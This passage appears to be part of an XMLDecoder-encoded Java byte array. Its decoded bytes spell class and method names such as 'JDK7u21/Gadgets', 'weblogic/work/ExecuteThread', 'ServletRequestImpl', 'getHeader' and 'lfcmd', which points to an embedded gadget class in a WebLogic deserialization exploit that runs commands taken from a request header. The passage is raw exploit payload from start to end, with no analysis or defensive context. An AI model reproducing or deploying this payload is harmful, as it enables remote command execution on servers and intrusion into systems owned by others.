&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1509"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1510"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1511"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1512"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1513"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1515"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="1516"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="1517"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1518"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="1519"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="1520"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1521"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="1522"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="1523"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1524"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="1525"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1526"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1527"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1528"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1529"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1530"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1531"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1533"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="1534"&gt; &lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="1535"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1536"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1537"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1538"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1539"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1540"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1541"&gt; &lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="1542"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1544"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="1545"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="1546"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1547"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1548"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1549"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1550"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1551"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1552"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1553"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1554"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1555"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1556"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1557"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1558"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1559"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1560"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1561"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="1563"&gt; &lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="1564"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1566"&gt; &lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="1567"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1568"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1569"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1570"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1571"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1572"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1573"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1574"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1575"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1576"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1577"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1578"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1579"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1580"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1582"&gt; &lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="1583"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="1584"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="1585"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1586"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="1587"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1588"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1589"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1590"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1591"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1592"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1593"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1594"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1595"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1596"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1597"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1598"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1599"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1600"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1601"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1602"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1603"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="1605"&gt; &lt;byte&gt;44&lt;/byte&gt;&lt;/void&gt;&lt;void index="1607"&gt; &lt;byte&gt;45&lt;/byte&gt;&lt;/void&gt;&lt;void index="1608"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="1610"&gt; &lt;byte&gt;43&lt;/byte&gt;&lt;/void&gt;&lt;void index="1612"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="1613"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1615"&gt; &lt;byte&gt;27&lt;/byte&gt;&lt;/void&gt;&lt;void index="1616"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="1617"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1618"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="1619"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1620"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1621"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1622"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1623"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1624"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1625"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="1626"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1627"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1628"&gt; &lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="1629"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1630"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="1631"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1632"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1633"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1634"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1635"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1636"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1637"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1638"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1639"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1640"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1641"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1642"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1643"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="1645"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="1646"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1648"&gt; &lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="1649"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1650"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1651"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1652"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="1653"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1654"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1655"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1656"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1657"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1658"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1659"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="1660"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1661"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1662"&gt; &lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="1663"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1665"&gt; &lt;byte&gt;29&lt;/byte&gt;&lt;/void&gt;&lt;void index="1666"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="1667"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="1668"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1669"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="1670"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1671"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="1672"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1673"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1674"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1675"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1676"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1677"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1678"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="1679"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1680"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1681"&gt; &lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="1682"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1683"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="1684"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1685"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1686"&gt; &lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="1687"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1688"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1689"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1690"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1691"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1692"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1693"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1694"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1695"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="1697"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="1699"&gt; &lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="1700"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="1702"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="1704"&gt; &lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="1705"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1707"&gt; &lt;byte&gt;44&lt;/byte&gt;&lt;/void&gt;&lt;void index="1708"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="1709"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1710"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="1711"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1712"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1713"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1714"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1715"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1716"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1717"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1718"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1719"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1720"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1721"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1722"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1723"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1724"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1725"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1726"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1727"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1728"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1729"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1730"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1731"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1732"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1733"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1734"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1735"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1736"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1737"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1738"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1739"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1740"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1741"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="1742"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1743"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="1744"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1745"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1746"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1747"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1748"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="1749"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1750"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1751"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1752"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="1754"&gt; &lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="1755"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1757"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="1758"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1759"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="1760"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1761"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1762"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1763"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="1765"&gt; &lt;byte&gt;56&lt;/byte&gt;&lt;/void&gt;&lt;void index="1766"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1768"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="1769"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1770"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1771"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1772"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="1773"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1774"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1775"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1776"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1777"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1778"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1780"&gt; &lt;byte&gt;38&lt;/byte&gt;&lt;/void&gt;&lt;void index="1781"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="1782"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1783"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="1784"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1785"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1786"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1787"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1788"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1789"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1790"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1791"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1792"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1793"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1794"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1795"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1796"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1797"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1798"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1799"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1800"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="1801"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1802"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="1803"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1804"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1805"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1806"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1807"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1808"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1809"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1810"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1811"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1812"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1813"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1814"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1815"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1816"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1817"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1818"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1819"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="1821"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="1823"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1824"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="1826"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="1828"&gt; &lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="1829"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1830"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="1831"&gt; &lt;byte&gt;-124&lt;/byte&gt;&lt;/void&gt;&lt;void index="1832"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="1833"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1834"&gt; &lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="1835"&gt; &lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="1836"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1837"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1838"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1839"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1840"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1841"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1842"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="1843"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1844"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="1845"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="1846"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1847"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1848"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="1849"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1850"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1851"&gt; &lt;byte&gt;56&lt;/byte&gt;&lt;/void&gt;&lt;void index="1852"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="1853"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1854"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1855"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="1856"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1857"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1858"&gt; &lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="1859"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="1860"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1861"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1862"&gt; 